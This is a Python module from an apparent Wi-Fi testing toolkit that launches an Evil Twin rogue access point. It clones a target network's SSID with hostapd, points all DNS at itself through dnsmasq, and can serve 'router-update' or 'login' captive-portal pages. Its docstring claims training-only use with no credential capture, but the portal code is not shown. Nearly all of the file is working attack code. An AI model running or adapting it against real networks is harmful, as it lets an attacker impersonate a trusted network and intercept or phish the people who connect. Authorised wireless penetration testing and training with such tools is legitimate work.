"""Evil Twin attack - creates a rogue AP mirroring a target network.

SAFETY NOTES:
- Does NOT capture or store passwords.
- Captive portal pages are for training only.
- No malware is ever served.
- All activity is logged.
"""
import subprocess
import time
import signal
import os
from pathlib import Path
from typing import Optional
from wifitest.logger import SessionLogger
from wifitest.adapter import enable_monitor_mode, disable_monitor_mode


HOSTAPD_CONF = """
interface={interface}
driver=nl80211
ssid={ssid}
channel={channel}
hw_mode=g
ignore_broadcast_ssid=0
"""

DNSMASQ_CONF = """
interface={interface}
dhcp-range=10.0.0.100,10.0.0.200,255.255.255.0,1h
address=/#/10.0.0.1
"""


def run_evil_twin(logger: SessionLogger, interface: str, ssid: str,
                  channel: int = 6, scenario: str = "none", **kwargs) -> None:
    """Launch an Evil Twin rogue access point."""
    if not ssid or len(ssid) > 32:
        raise ValueError("Invalid SSID")

    mon_iface = enable_monitor_mode(interface)
    logger.event("monitor_enabled", interface=interface, monitor=mon_iface)

    # Write hostapd config
    hostapd_conf = HOSTAPD_CONF.format(interface=mon_iface, ssid=ssid, channel=channel)
    conf_path = Path("/tmp/wifitest_hostapd.conf")
    conf_path.write_text(hostapd_conf)

    # Write dnsmasq config
    dnsmasq_conf = DNSMASQ_CONF.format(interface=mon_iface)
    dns_path = Path("/tmp/wifitest_dnsmasq.conf")
    dns_path.write_text(dnsmasq_conf)

    # Start dnsmasq
    dns_proc = subprocess.Popen(["dnsmasq", "-C", str(dns_path), "-d"],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    logger.event("dnsmasq_started", pid=dns_proc.pid)

    # Start hostapd
    hapd_proc = subprocess.Popen(["hostapd", str(conf_path)],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    logger.event("hostapd_started", pid=hapd_proc.pid, ssid=ssid, channel=channel)

    # Start captive portal scenario if requested
    portal_proc = None
    if scenario != "none":
        portal_proc = _start_scenario(scenario, logger)

    logger.event("evil_twin_active", ssid=ssid, scenario=scenario)

    try:
        # Keep running until interrupted
        while True:
            time.sleep(1)
    finally:
        logger.event("evil_twin_stopping", ssid=ssid)
        for proc in [portal_proc, hapd_proc, dns_proc]:
            if proc and proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
        disable_monitor_mode(mon_iface)
        logger.event("cleanup_complete")


def _start_scenario(scenario: str, logger: SessionLogger):
    """Start a safe captive portal scenario server."""
    if scenario == "router-update":
        from wifitest.scenarios.router_update import start_server
    elif scenario == "login":
        from wifitest.scenarios.login_page import start_server
    else:
        return None
    return start_server(port=80, logger=logger)
